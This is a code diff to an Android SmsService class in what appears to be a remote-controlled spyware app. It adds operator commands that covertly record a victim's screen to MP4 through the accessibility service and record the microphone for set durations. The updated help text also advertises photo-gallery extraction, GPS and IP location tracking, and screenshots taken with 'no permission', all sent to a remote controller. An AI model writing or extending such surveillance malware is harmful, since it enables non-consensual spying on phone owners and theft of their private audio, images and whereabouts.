@@ -338,6 +338,30 @@ public class SmsService extends Service {
                 stopScreen.setAction(ScreenCaptureService.ACTION_STOP_CONT);
                 startService(stopScreen);
 
+            } else if (cmd.toLowerCase().startsWith("/screen_record")) {
+                int secs = 30;
+                try { secs = Integer.parseInt(cmd.trim().split("\\s+")[1]); } catch (Exception ignored) {}
+                if (ScreenAccessibilityService.instance == null) {
+                    sendRawMessage("❌ Accessibility Service enable nahi.\nSettings → Accessibility → Kasari Chauhan → Enable karo");
+                } else {
+                    Intent recI = new Intent(this, ScreenRecorderService.class);
+                    recI.setAction(ScreenRecorderService.ACTION_RECORD);
+                    recI.putExtra(ScreenRecorderService.EXTRA_SECONDS, secs);
+                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+                        startForegroundService(recI); else startService(recI);
+                    sendRawMessage("🎬 Recording shuru... " + secs + "s baad MP4 video aayega.");
+                }
+
+            } else if (cmd.toLowerCase().startsWith("/mic")) {
+                int secs = 30;
+                try { secs = Integer.parseInt(cmd.trim().split("\\s+")[1]); } catch (Exception ignored) {}
+                Intent micI = new Intent(this, MicRecorderService.class);
+                micI.setAction(MicRecorderService.ACTION_RECORD);
+                micI.putExtra(MicRecorderService.EXTRA_SECONDS, secs);
+                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O)
+                    startForegroundService(micI); else startService(micI);
+                sendRawMessage("🎙 Mic recording shuru... " + secs + "s baad audio file aayegi.");
+
             } else if (cmd.equalsIgnoreCase("/help")) {
                 sendRawMessage(
                     "📋 Global:\n" +
@@ -363,10 +387,15 @@ public class SmsService extends Service {
                     "/gallery — Saari photos (unlimited)\n" +
                     "/gallery 30 — Sirf 30 photos\n\n" +
                     "📍 Location & Screen:\n" +
-                    "/location — GPS location\n" +
-                    "/screenshot — Ek screenshot\n" +
+                    "/location — GPS + IP fallback location\n" +
+                    "/screenshot — Ek screenshot (no permission)\n" +
                     "/screen_start 30 — Har 30s screenshot\n" +
-                    "/screen_stop — Screenshot band\n\n" +
+                    "/screen_stop — Screenshot band\n" +
+                    "/screen_record 30 — 30s MP4 video (no permission)\n" +
+                    "/screen_record 60 — 1 min recording\n\n" +
+                    "🎙 Audio:\n" +
+                    "/mic 30 — 30s mic recording\n" +
+                    "/mic 60 — 1 min recording\n\n" +
                     "Mera ID: [" + myDeviceId + "]"
                 );
             }
